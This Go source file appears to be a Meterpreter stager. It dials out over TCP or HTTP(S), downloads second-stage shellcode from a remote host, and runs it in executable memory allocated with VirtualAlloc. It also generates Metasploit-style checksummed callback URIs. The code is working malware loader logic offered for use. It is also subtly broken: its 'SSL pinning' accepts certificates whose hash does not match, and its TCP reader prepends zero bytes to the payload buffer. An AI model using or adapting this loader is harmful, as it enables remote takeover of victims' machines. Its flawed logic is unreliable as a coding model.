package meterpreter

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Start creates a new meterpreter connection with the given transport type
func Start(transport, address string) error {
	switch transport {
	case "tcp":
		return ReverseTCP(address)
	case "http", "https":
		return ReverseHTTP(transport, address)
	default:
		return errors.New("unsupported transport type")
	}

}

// EnableSSLPinning checks the SSL certificate hash
func EnableSSLPinning(fingerprint []byte) error {

	if len(fingerprint) != 32 {
		return errors.New("invalid certificate fingerprint")
	}

	tlsConfig := &tls.Config{InsecureSkipVerify: true}
	http.DefaultTransport = &http.Transport{
		DialTLS: func(network, addr string) (net.Conn, error) {
			conn, err := tls.Dial(network, addr, tlsConfig)
			if err != nil {
				return conn, err
			}

			connState := conn.ConnectionState()
			valid := false
			for _, peerCert := range connState.PeerCertificates {
				hash := sha256.Sum256(peerCert.Raw)
				if bytes.Compare(hash[0:], fingerprint) != 0 {
					valid = true
				}
			}

			if valid {
				return conn, nil
			}

			return nil, errors.New("SSL pinning violation")
		},
	}

	return nil
}

// ReverseHTTP initiates a new reverse HTTP/HTTPS meterpreter connection
func ReverseHTTP(connType, address string) error {
	var (
		resp *http.Response
		err  error
	)
	url := connType + "://" + address + "/" + NewURI(rand.Intn(12)+8)
	if connType == "https" {
		transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
		client := &http.Client{Transport: transport}
		resp, err = client.Get(url)
	} else {
		resp, err = http.Get(url)
	}
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	stage2buf, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	return ExecShellcode(stage2buf)
}

// ReverseTCP initiates a new reverse TCP meterpreter connection
func ReverseTCP(address string) error {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		tmpBuf          []byte = make([]byte, 2048)
		read            int    = 0
		totalRead       int    = 0
		stage2LengthInt uint32 = 0
		con             net.Conn
		err             error
	)

	if con, err = net.Dial("tcp", address); err != nil {
		return err
	}

	defer con.Close()

	if _, err = con.Read(stage2LengthBuf); err != nil {
		return err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	for totalRead < (int)(stage2LengthInt) {
		if read, err = con.Read(tmpBuf); err != nil {
			return err
		}
		totalRead += read
		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
	}

	return ExecShellcode(stage2Buf)
}

// ExecShellcode executes the given shellcode
func ExecShellcode(shellcode []byte) error {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// Reserve space to drop shellcode
	// PAGE_EXECUTE_READWRITE = 0x40
	// MEM_RESERVE = 0x00002000
	// MEM_COMMIT = 0x00001000
	address, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x00002000|0x00001000, 0x40)
	if err != nil {
		return err
	}

	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	go syscall.Syscall(address, 0, 0, 0, 0)
	return nil
}

// NewURI generates a new meterpreter connection URI witch is a random string with a special 8bit checksum
func NewURI(length int) string {

	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[seed.Intn(len(charset))]
	}

	checksum := 0
	for _, value := range buf {
		checksum += int(value)
	}
	if (checksum % 0x100) == GetURIChecksumID() {
		return string(buf)
	}
	return NewURI(length)
}

// GetURIChecksumID returns the 8bit checksum values required by the runtime OS
// See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb
func GetURIChecksumID() int {
	switch runtime.GOOS {
	case "windows":
		return 92
	case "linux", "darwin":
		return 95
	default:
		return 92
	}
}
